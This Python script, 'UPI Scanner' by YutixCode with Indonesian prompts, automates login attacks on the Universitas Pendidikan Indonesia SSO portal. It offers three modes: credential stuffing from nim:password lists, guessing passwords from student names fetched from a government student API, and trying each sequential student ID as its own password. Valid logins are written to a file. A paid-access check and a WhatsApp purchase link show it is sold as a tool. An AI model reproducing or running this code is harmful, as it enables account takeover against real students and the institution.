import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install --upgrade pip')
    os.system('pip install requests bs4')
    os.system('clear')
    exit('Install bahan selesai\nSilahkan restart script')
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname()
    me = rv.release
    found = []
    error = []

    def upi(i, usr, pwd):
        ses = req.Session()
        url = 'https://sso.upi.edu/cas/login'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')[2]['value']
        dat = {'username':usr,  'password':pwd, 
         'execution':tok, 
         '_eventId':'submit', 
         'submit':'LOGIN'}
        gas = ses.post(url, data=dat).text
        res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
        if res == 'success':
            print(f" {purple}[{white}{i}{purple}]{green} aktif {white}>{green} {usr}{white}:{green}{pwd}")
            found.append(i)
            with open('aktif.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        else:
            print(f" {purple}[{white}{i}{purple}]{red} modar {white}>{red} {usr}{white}:{red}{pwd}")
            error.append(i)


    def done():
        print(f" {cyan}[{white}!{cyan}]{white} Scan selesai")
        print(f" {purple}[{white}!{purple}]{white} Aktif: {green}{len(found)}")
        print(f" {purple}[{white}!{purple}]{white} Modar: {red}{len(error)}")
        print(f" {purple}[{white}!{purple}]{white} Akun aktif tersimpan")
        exit(f" {cyan}[{white}*{cyan}]{white} Subscribe: {cyan}YutixCode")


    def main():
        try:
            os.system('clear')
            print(f"{off} ____________________________")
            print(f"{off}[{flag} UPI Scanner | by YutixCode {off}]")
            akses = req.get(f"https://yutixcode.xyz/akses/upi/{me}", timeout=10, verify=False).status_code
            if akses != 200:
                print(f"\n {purple}[{white}1{purple}]{white} Scan")
                print(f" {purple}[{white}2{purple}]{white} Smart scan")
                print(f" {purple}[{white}3{purple}]{white} Auto generate")
                select = input(f" {cyan}[{white}?{cyan}]{white} Pilih: ")
                if select == '1':
                    print(f" {purple}[{white}!{purple}]{white} Isi file txt harus nim:pwd")
                    print(f" {purple}[{white}!{purple}]{white} Masukan file")
                    path = input(f" {cyan}[{white}?{cyan}]{white} ")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f" {purple}[{white}!{purple}]{white} Total {len(lines)} baris terdeteksi")
                        for line in lines:
                            data = line.strip()
                            user = data.split(':')[0]
                            pswd = data.split(':')[1]
                            if len(data) > 0:
                                upi(count, user, pswd)
                                count += 1
                                continue

                    done()
                elif select == '2':
                    print(f" {purple}[{white}!{purple}]{white} Isi file txt hanya nim")
                    print(f" {purple}[{white}!{purple}]{white} Masukan file")
                    path = input(f" {cyan}[{white}?{cyan}]{white} ")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f" {purple}[{white}!{purple}]{white} Total {len(lines)} baris terdeteksi")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            upi(count, nim, (f"{ser[0].title()}"))
                            count += 1
                            upi(count, nim, f"{ser[0].title()}123")
                            count += 1

                    done()
                else:
                    if select == '3':
                        print(f" {purple}[{white}!{purple}]{white} Masukan nim sebagai patokan")
                        print(f" {purple}[{white}!{purple}]{white} Contoh: 1703900")
                        uid = int(input(f" {cyan}[{white}?{cyan}]{white} Nim: "))
                        max = int(input(f" {cyan}[{white}?{cyan}]{white} Max: "))
                        for i in range(max):
                            upi(i + 1, uid, uid)
                            uid += 1
                        else:
                            done()

                    else:
                        exit(f"{purple} [{white}!{purple}] {white}Input error")
            else:
                print(f"\n {purple}[{white}!{purple}]{white} Script ini berbayar")
                print(f" {purple}[{white}!{purple}]{white} Kode akses: {green}{me}")
                input(f" {purple}[{white}!{purple}]{white} Tekan enter untuk membeli {purple}> ")
                msg = f"Beli Script *UPI Scanner*\nAccessCode: {me}\n"
                print(f" {purple}[{white}!{purple}]{white} Mengalihkan ke WA ...")
                time.sleep(1.5)
                os.system(f"xdg-open https://wa.me/+6282321062760?text={urllib.parse.quote(msg, safe='')}")
        except KeyboardInterrupt:
            exit(f"{purple} [{white}!{purple}] {white}Keyboard Interrupted")
        except FileNotFoundError:
            exit(f"{purple} [{white}!{purple}] {white}File tidak ditemukan")
        except IndexError:
            exit(f"{purple} [{white}!{purple}] {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                exit(f"{purple} [{white}!{purple}] {white}Something error, sorry :(")
            finally:
                e = None
                del e


    if __name__ == '__main__':
        main()
